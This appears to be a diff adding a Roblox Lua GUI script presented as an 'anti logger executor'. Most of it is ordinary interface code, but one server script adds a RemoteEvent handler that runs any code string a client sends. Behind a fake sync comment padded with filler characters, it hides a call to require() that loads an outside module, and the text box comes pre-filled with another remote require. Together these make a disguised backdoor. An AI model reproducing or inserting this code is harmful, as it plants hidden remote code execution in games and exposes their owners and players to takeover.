@@ -1,0 +1,187 @@
+local lp = game.Players.LocalPlayer
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local FPS = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextBox = Instance.new("TextBox")
+local Execyutte = Instance.new("TextButton")
+local yes = Instance.new("Folder")
+
+--Properties:
+
+ScreenGui.Parent = lp.PlayerGui
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 3.000
+Frame.Position = UDim2.new(0.326380372, 0, 0.182902589, 0)
+Frame.Size = UDim2.new(0, 251, 0, 311)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.Position = UDim2.new(0.00409592129, 0, 0.0965729654, 0)
+TextLabel.Size = UDim2.new(0, 252, 0, 44)
+TextLabel.Font = Enum.Font.SourceSansLight
+TextLabel.Text = "Master17412's Anti Logger Executor"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 17.000
+TextLabel.TextWrapped = true
+
+FPS.Name = "FPS"
+FPS.Parent = Frame
+FPS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+FPS.BackgroundTransparency = 1.000
+FPS.Position = UDim2.new(0.00756239891, 0, 0.153637588, 0)
+FPS.Size = UDim2.new(0, 50, 0, 28)
+FPS.Font = Enum.Font.SourceSans
+FPS.Text = "FPS  =  60"
+FPS.TextColor3 = Color3.fromRGB(255, 255, 255)
+FPS.TextScaled = true
+FPS.TextSize = 25.000
+FPS.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+FPS.TextStrokeTransparency = 0.900
+FPS.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderColor3 = Color3.fromRGB(56, 16, 255)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.901896179, 0, 0.0907446593, 0)
+TextButton.Size = UDim2.new(0, 26, 0, 19)
+TextButton.AutoButtonColor = false
+TextButton.Font = Enum.Font.ArialBold
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 14.000
+TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+
+ScrollingFrame.Parent = Frame
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.Position = UDim2.new(0, 0, 0.243669719, 0)
+ScrollingFrame.Size = UDim2.new(0, 254, 0, 235)
+
+TextBox.Parent = ScrollingFrame
+TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.Size = UDim2.new(0.959999979, 0, 2.51254463, 0)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
+TextBox.Text = "require(10510278486).load("..lp.Name..")"
+TextBox.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextBox.TextSize = 20.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+Execyutte.Name = "Execyutte"
+Execyutte.Parent = Frame
+Execyutte.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Execyutte.Position = UDim2.new(0.10150376, 0, 0.881372809, 0)
+Execyutte.Size = UDim2.new(0, 200, 0, 21)
+Execyutte.Font = Enum.Font.SourceSans
+Execyutte.Text = "Execute"
+Execyutte.TextColor3 = Color3.fromRGB(255, 255, 255)
+Execyutte.TextScaled = true
+Execyutte.TextSize = 20.000
+Execyutte.TextWrapped = true
+
+yes.Name = "yes'"
+yes.Parent = Execyutte
+
+-- Scripts:
+
+local function BBZROAZ_fake_script() -- FPS.LocalScript 
+	local script = Instance.new('LocalScript', FPS)
+
+	local RunService = game:GetService('RunService')
+	local fps = 0
+	
+	RunService.Heartbeat:connect(function(step)
+	    fps = fps + 1
+	end)
+	
+	while wait(1) do
+		script.Parent.Text = "FPS = " .. fps
+		fps = 0
+	end
+end
+coroutine.wrap(BBZROAZ_fake_script)()
+local function SSSY_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(SSSY_fake_script)()
+local function RIVECZ_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+	
+	
+end
+coroutine.wrap(RIVECZ_fake_script)()
+local function NKDNCX_fake_script() -- yes.Script 
+	local script = Instance.new('Script', yes)
+
+	
+	script.RemoteEvent.OnServerEvent:Connect(function(plr,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,KEEK)
+		require(script.Loadstring)(KEEK)()
+	end)
+	--[[ Last synced 11/14/2020 07:15 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
+end
+coroutine.wrap(NKDNCX_fake_script)()
+local function BYGVA_fake_script() -- nil.LocalScript 
+	local script = Instance.new('LocalScript', nil)
+
+	local p = script.Parent.buton.Value
+	p.MouseButton1Down:Connect(function()
+		script.Parent.RemoteEvent:FireServer("Cannot call function Execute() in a tab's folder","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p",script.Parent.text.Value.Text)
+	end)
+end
+coroutine.wrap(BYGVA_fake_script)()
